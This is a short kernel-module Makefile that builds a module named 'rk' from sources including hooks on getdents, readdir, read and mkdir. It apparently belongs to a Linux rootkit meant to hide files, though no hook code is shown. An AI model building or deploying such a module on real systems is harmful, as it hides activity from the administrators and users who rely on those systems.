obj-m += rk.o
rk-objs := ../src/rk_main.o ../src/device.o ../src/procfs.o ../src/hooklib/hooklib.o ../src/hooks/hooks.o ../src/hooks/mkdir_hook.o ../src/hooks/getdents_hook.o ../src/tools/string_list.o ../src/hooks/readdir_hook.o ../src/tools/tools.o ../src/hooks/read_hook.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

rm_o:
	find . -type f -name '*.o' -delete
